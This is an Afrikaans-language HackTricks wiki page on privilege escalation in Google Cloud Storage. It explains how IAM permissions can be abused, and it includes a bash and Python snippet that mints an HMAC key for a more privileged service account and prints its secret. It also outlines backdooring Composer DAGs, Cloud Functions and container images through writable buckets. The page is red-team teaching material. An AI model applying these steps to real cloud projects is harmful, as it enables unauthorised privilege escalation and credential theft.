# GCP - Storage Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Storage

Basiese Inligting:

{% content-ref url="../gcp-services/gcp-storage-enum.md" %}
[gcp-storage-enum.md](../gcp-services/gcp-storage-enum.md)
{% endcontent-ref %}

### `storage.objects.get`

Hierdie toestemming laat jou toe om **l√™ers wat in Cloud Storage gestoor is af te laai**. Dit sal moontlik jou toelaat om voorregte te verhoog omdat in sommige gevalle **sensitiewe inligting daar gestoor word**. Boonop stoor sommige GCP-dienste hul inligting in emmers:

* **GCP Composer**: Wanneer jy 'n Composer Omgewing skep, sal die **kode van al die DAGs** in 'n **emmer** gestoor word. Hierdie take kan interessante inligting in hul kode bevat.
* **GCR (Container Registry)**: Die **beeld** van die houers word in **emmer** gestoor, wat beteken dat as jy die emmers kan lees, jy die beelde kan aflaai en **soek na lekke en/of bronkode**.

### `storage.objects.setIamPolicy`

Jy kan jou toestemming gee om **enige van die vorige scenario's van hierdie afdeling te misbruik**.

### **`storage.buckets.setIamPolicy`**

Vir 'n voorbeeld van hoe om toestemmings met hierdie toestemming te wysig, kyk na hierdie bladsy:

{% content-ref url="../gcp-unaunthenticated-enum-and-access/gcp-storage-unauthenticated-enum/gcp-public-buckets-privilege-escalation.md" %}
[gcp-public-buckets-privilege-escalation.md](../gcp-unaunthenticated-enum-and-access/gcp-storage-unauthenticated-enum/gcp-public-buckets-privilege-escalation.md)
{% endcontent-ref %}

### `storage.hmacKeys.create`

Cloud Storage se "interoperabiliteit" kenmerk, ontwerp vir **kruis-cloud interaksies** soos met AWS S3, behels die **skepping van HMAC sleutels vir Diensrekeninge en gebruikers**. 'n Aanvaller kan dit misbruik deur **'n HMAC-sleutel vir 'n Diensrekening met verhoogde voorregte te genereer**, wat dus **voorregte binne Cloud Storage verhoog**. Terwyl gebruikers-geassosieerde HMAC-sleutels slegs via die webkonsol verkrygbaar is, bly beide die toegang en geheime sleutels **perpetueel toeganklik**, wat moontlike rugsteun toegang tot stoor bied. Aan die ander kant is Diensrekening-gekoppelde HMAC-sleutels API-toeganklik, maar hul toegang en geheime sleutels is nie na skepping verkrygbaar nie, wat 'n laag van kompleksiteit vir voortdurende toegang byvoeg.

{% code overflow="wrap" %}
```bash
# Create key
gsutil hmac create <sa-email> # You might need to execute this inside a VM instance

## If you have TROUBLES creating the HMAC key this was you can also do it contacting the API directly:
PROJECT_ID = '$PROJECT_ID'
TARGET_SERVICE_ACCOUNT = f"exam-storage-sa-read-flag-3@{PROJECT_ID}.iam.gserviceaccount.com"
ACCESS_TOKEN = "$CLOUDSDK_AUTH_ACCESS_TOKEN"
import requests
import json
key = requests.post(
f'https://www.googleapis.com/storage/v1/projects/{PROJECT_ID}/hmacKeys',
params={'access_token': ACCESS_TOKEN, 'serviceAccountEmail': TARGET_SERVICE_ACCOUNT}
).json()
#print(json.dumps(key, indent=4))
print(f'ID: {key["metadata"]["accessId"]}')
print(f'Secret: {key["secret"]}')


# Configure gsutil to use the HMAC key
gcloud config set pass_credentials_to_gsutil false
gsutil config -a

# Use it
gsutil ls gs://[BUCKET_NAME]

# Restore
gcloud config set pass_credentials_to_gsutil true
```
{% endcode %}

Nog 'n eksploit-skrip vir hierdie metode kan [hier](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/storage.hmacKeys.create.py) gevind word.

## `storage.objects.create`, `storage.objects.delete` = Berging Skryf regte

Om 'n **nuwe objek** binne 'n emmer te **skep**, benodig jy `storage.objects.create` en, volgens [die dokumentasie](https://cloud.google.com/storage/docs/access-control/iam-permissions#object\_permissions), benodig jy ook `storage.objects.delete` om 'n bestaande objek te **wysig**.

'n Baie **gewone eksploitering** van emmers waar jy in die wolk kan skryf, is in die geval waar die **emmer webbediener l√™ers stoor**, jy mag in staat wees om **nuwe kode** te **stoor** wat deur die webtoepassing gebruik sal word.

### Composer

**Composer** is **Apache Airflow** wat binne GCP bestuur word. Dit het verskeie interessante kenmerke:

* Dit loop binne 'n **GKE-kluster**, so die **SA wat die kluster gebruik is toeganklik** deur die kode wat binne Composer loop
* Dit stoor die **kode in 'n emmer**, daarom, **enige iemand met skryf toegang oor daardie emmer** sal in staat wees om 'n DGA-kode (die kode wat Apache Airflow sal uitvoer) te verander/te voeg\
As jy **skryf toegang oor die emmer het wat Composer gebruik** om die kode te stoor, kan jy **privesc na die SA wat in die GKE-kluster loop**.

### Cloud Functions

* Cloud Functions kode word in Berging gestoor en wanneer 'n nuwe weergawe geskep word, word die kode na die emmer gestoot en dan word die nuwe houer van hierdie kode gebou. Daarom, **om die kode te oorskryf voordat die nuwe weergawe gebou word, is dit moontlik om die wolk funksie te laat uitvoer willekeurige kode**.

Jy kan 'n PoC van hierdie aanval in die repo vind: [https://github.com/carlospolop/Monitor-Backdoor-Cloud-Functions](https://github.com/carlospolop/Monitor-Backdoor-Cloud-Functions)

### App Engine

* App Engine bronkode word in emmers gestoor, **om die kode te oorskryf kan dit moontlik wees om willekeurige kode uit te voer. DIT IS NIE MOGELIK NIE**
* **Dit lyk of houer lae in die emmer gestoor word, miskien om dit te verander?**

### GCR

* **Google Container Registry** stoor die beelde binne emmers, as jy kan **daardie emmers skryf**, mag jy in staat wees om **lateraal te beweeg na waar daardie emmers uitgevoer word.**
* Die emmer wat deur GCR gebruik word, sal 'n URL h√™ wat soortgelyk is aan `gs://<eu/usa/asia/nothing>.artifacts.<project>.appspot.com` (Die topvlak subdomeine is [hier](https://cloud.google.com/container-registry/docs/pushing-and-pulling) gespesifiseer).

## **Verwysings**

* [https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/#:\~:text=apiKeys.-,create,privileges%20than%20our%20own%20user.](https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
